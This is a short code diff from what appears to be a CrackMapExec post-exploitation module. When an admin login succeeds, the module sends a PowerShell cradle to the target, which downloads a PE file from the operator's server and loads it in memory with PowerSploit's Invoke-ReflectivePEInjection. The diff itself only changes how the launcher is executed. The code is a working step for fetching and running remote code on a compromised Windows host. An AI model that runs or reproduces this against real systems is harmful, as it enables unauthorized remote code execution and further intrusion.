@@ -41,7 +41,7 @@ class CMEModule:
         self.ps_script = obfs_ps_script('powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1')
 
     def on_admin_login(self, context, connection):
- 
+
         payload = """
         $WebClient = New-Object System.Net.WebClient;
         [Byte[]]$bytes = $WebClient.DownloadData('{server}://{addr}:{port}/{pefile}');
@@ -58,8 +58,7 @@ class CMEModule:
 
         launcher = gen_ps_iex_cradle(context, 'Invoke-ReflectivePEInjection.ps1', payload, post_back=False)
 
-        ps_command = create_ps_command(launcher, force_ps32=True)
-        connection.execute(ps_command)
+        connection.ps_execute(launcher, force_ps32=True)
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
